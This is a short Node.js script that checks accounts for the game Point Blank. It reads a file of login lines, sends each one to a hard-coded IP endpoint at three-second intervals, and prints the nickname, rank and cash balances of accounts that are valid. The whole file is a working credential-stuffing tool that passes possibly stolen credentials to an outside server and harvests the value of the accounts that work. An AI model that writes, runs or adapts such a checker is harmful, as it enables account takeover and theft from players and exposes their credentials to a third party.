const fs = require("fs");
const fetch = require("node-fetch");

      function timer(ms) {
        return new Promise(res => setTimeout(res, ms));
     } 

     async function cek(data){

         let e = data.split('\n');
         e.pop();

	 for(d of e) {
	   fetch('http://18.136.209.239:6969/pointblank?account='+d)
           .then(res => res.json())
           .then(res => console.log(pb(res)))
	   .catch(() => console.log('Invalid Account'));

	  await timer(3000);
	};

   }

      function pb(res){
	let pb = `=======ACCOUNT=======
		  Data Login : ${res.info}
		  Nickname   : ${res.nickname}
		  Rank Img   : ${res.rank_img}
		  Cash Real  : ${res.cash_real}
		  Cash Bonus : ${res.cash_bonus}
		  Total Cash : ${res.total_cash}
		  ======INFORMATION=======
		`;
      return (res.valid == false) ? 'Wrong ID/PASS' :  pb;
      }
  	let result = fs.readFileSync('tes.txt', 'utf-8');

	cek(result);

